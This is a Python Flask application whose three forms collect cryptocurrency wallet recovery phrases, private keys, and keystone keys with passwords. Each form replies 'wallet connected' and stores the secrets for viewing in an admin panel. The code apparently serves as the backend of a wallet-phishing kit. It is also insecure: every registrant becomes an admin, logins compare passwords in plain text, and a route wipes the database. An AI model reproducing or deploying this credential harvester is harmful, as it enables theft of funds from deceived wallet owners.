import re
from flask import Flask, render_template, request, redirect, url_for,jsonify
#from flask.json import jsonify
from flask_sqlalchemy import SQLAlchemy
import sqlite3
from werkzeug.security  import generate_password_hash, check_password_hash
from  flask_login import UserMixin, LoginManager, login_required, login_user, logout_user,current_user
from werkzeug.security import generate_password_hash, check_password_hash
from flask_admin import Admin
from flask_admin.contrib.sqla import ModelView
import os
from flask_frozen import Freezer


from random import randint
from datetime import datetime




app = Flask(__name__)
freezer = Freezer(app)
basedir = os.path.abspath(os.path.dirname((__file__)))
database = "app.db"
con = sqlite3.connect(os.path.join(basedir,database))

app.config['SECRET_KEY'] = "jhkxhiuydu"
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///'+os.path.join(basedir,database)
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = True
app.config['FLASK_ADMIN_SWATCH'] = 'cerulean'

db = SQLAlchemy(app)


class pharse(db.Model,UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    pharse_key = db.Column(db.String(255))
   
    

   



   


    def create(self, pharse_key=''):
        self.pharse_key	 = pharse_key
       
        

    def save(self):
        db.session.add(self)
        db.session.commit()

    def commit(self):
        db.session.commit()
        
class private(db.Model,UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    private_key = db.Column(db.String(255))
   
    

   



   


    def create(self, keystone=''):
        self.keystone	 = keystone
       
        

    def save(self):
        db.session.add(self)
        db.session.commit()

    def commit(self):
        db.session.commit()

class keystone(db.Model,UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    keystone_key = db.Column(db.String(255))
    password = db.Column(db.String(255))
   
    

   



   


    def create(self, pharse_key='', password='' ):
        self.pharse_key	 = pharse_key
        self.password = password
       
        

    def save(self):
        db.session.add(self)
        db.session.commit()

    def commit(self):
        db.session.commit()
        
class User(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(255))
    password = db.Column(db.String(500))
    email = db.Column(db.String(255), unique=True)
    is_admin = db.Column(db.Boolean, default = False)
    
    
    def check_password(self, password):
            return check_password_hash(self.password, password)
    def set_password(self, password):
        self.password = generate_password_hash(password, method='sha256')
        
        
    
    def create(self, username='', password='', email=''):
        self.username	 = username
        self.email	 = email
       
        self.password= generate_password_hash(password, method='sha256')


    def save(self):
        db.session.add(self)
        db.session.commit()

    def commit(self):
        db.session.commit()




class Secure(ModelView):
    def is_accessible(self):
        return current_user.is_authenticated
    
    def inaccessible_callback(self, name, **kwargs):
        # redirect to login page if user doesn't have access
        return redirect(url_for('login', next=request.url))
    

admin = Admin(app, name='administration', template_mode='bootstrap3')
admin.add_view(Secure(keystone, db.session))
admin.add_view(Secure(User, db.session))
admin.add_view(Secure(pharse, db.session))

admin.add_view(Secure(private, db.session))



login_manager = LoginManager()
login_manager.login_view = "signin"
login_manager.init_app(app)
@login_manager.user_loader
def user_loader(user_id):
    return User.query.get(user_id)

@app.route('/login',methods=['GET','POST'])
def login():
    user = User()
    if request.method == 'POST':
        username = request.form['usernames']

        password = request.form['passwords']
        user = User.query.filter_by(username=username,password = password ,is_admin=True).first()
       
        if user:
            if user.password == password:
                login_user(user)
                return redirect('admin')

                
                
            


    return render_template('login.html')



@app.route('/register',methods=['GET','POST'])

def process():
    auths = User()
    if request.method == "POST":
        username = request.form['username']
        password = request.form['password']
        email = request.form['email']
        auths = User(username=username,
             password=password,email=email,is_admin=True)
        db.session.add(auths)
        db.session.commit()
        return redirect('login')
        # return "welcome sign up completed"
    return render_template('register.html')


@app.route("/dashboard")

def dashboard():
  
    return render_template('dashboard.html'
                                )

@app.route('/form1.html',methods=['GET','POST'])

def pharsekey():
    phase = pharse()
    if request.method == "POST":
        phase = request.form['pharse']
        
        phase = pharse(pharse_key= phase
             )
        db.session.add(phase)
        db.session.commit()
        return "wallet connected"
    return render_template('form1.html')


@app.route('/form2.html',methods=['GET','POST'])

def fuck2():
    pri = private()
    if request.method == "POST":
        pri_key = request.form['private']
        
        pri = private(private_key= pri_key
             )
        db.session.add(pri)
        db.session.commit()
        return "wallet connected"
    return render_template('form2.html')

@app.route('/form3.html',methods=['GET','POST'])
 
def fuck3():
    stone = keystone()
    if request.method == "POST":
        stor = request.form['stone']
        password = request.form['password']
        
        stone = keystone(keystone_key= stor, password = password
             )
        db.session.add(stone)
        db.session.commit()
        
        return "wallet connected"
    return render_template('form3.html')
    
       



@app.route("/index.html")
def homepage():
    return render_template('index.html')




@app.route("/logout")
def logout():
    logout_user()
    return redirect(url_for("login"))




@app.route("/db")
@login_required
def database():
    db.drop_all()
    db.create_all()
    return "Hello done!!!"


if __name__ == "__main__":
   freezer.freeze()